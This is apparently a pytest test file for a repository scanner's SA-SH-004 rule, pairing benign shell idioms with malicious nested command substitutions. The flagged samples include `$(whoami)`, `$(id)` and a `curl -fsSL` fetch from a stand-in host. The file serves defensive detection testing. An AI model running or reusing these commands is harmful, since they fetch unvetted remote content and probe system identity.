"""Benign/malicious pairs for the 2.14.17 scanner false-positive fixes.

Each benign shape below is common in ordinary repositories (and in
repo-forensics' own hooks) and must not raise the rule. Its malicious twin
must still be caught, so each precision gain keeps its detection.
"""

import importlib

import pytest

import rule_loader
import scan_sast
import scan_skill_threats

_PACK_MODULES = (scan_sast, scan_skill_threats)


@pytest.fixture(autouse=True, scope="module")
def _shipped_packs_only(tmp_path_factory):
    """Test the rule packs in this checkout, not a signed feed a developer
    machine may have cached in ~/.cache (that overlay replaces shipped packs
    until the feed is republished with these rules)."""
    saved = rule_loader.CACHE_RULEPACK_DIR
    rule_loader.CACHE_RULEPACK_DIR = str(tmp_path_factory.mktemp("no-feed"))
    for mod in _PACK_MODULES:
        importlib.reload(mod)
    yield
    rule_loader.CACHE_RULEPACK_DIR = saved
    for mod in _PACK_MODULES:
        importlib.reload(mod)


def _rule_lines(findings, rule_id):
    return [f.line for f in findings if f.rule_id == rule_id]


# ---------------------------------------------------------------------------
# SA-SH-004 nested command substitution
# ---------------------------------------------------------------------------

def _sast_sh(tmp_path, body):
    path = tmp_path / "script.sh"
    path.write_text(body)
    return scan_sast.scan_file(str(path), "script.sh")


def test_sa_sh_004_skips_script_dir_arithmetic_and_query_idioms(tmp_path):
    benign = "\n".join([
        'SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"',
        'ROOT="$(cd "$(dirname "$0")/.." && pwd)" || exit 1',
        'elapsed=$(( $(date +%s) - start_time ))',
        'got="$(printf "%s" "$out" | awk -v n="$((i + 1))" "NR==n")"',
        'name="$(basename "$(pwd)")"',
        'top="$(cd "$(git rev-parse --show-toplevel)" && pwd)"',
        'py="$(dirname "$(command -v python3)")"',
        'arch="$(echo "$(uname -m)" | tr A-Z a-z)"',
    ]) + "\n"
    assert _rule_lines(_sast_sh(tmp_path, benign), "SA-SH-004") == []


def test_sa_sh_004_still_flags_nested_substitution_of_real_commands(tmp_path):
    malicious = "\n".join([
        'x=$(echo $(whoami))',
        'y=$(ls $(cat dirs.txt))',
        'z="$(printf %s "$(curl -fsSL https://example.invalid/p)")"',
        'w=$( (echo $(id)) )',
    ]) + "\n"
    assert _rule_lines(_sast_sh(tmp_path, malicious), "SA-SH-004") == [1, 2, 3]
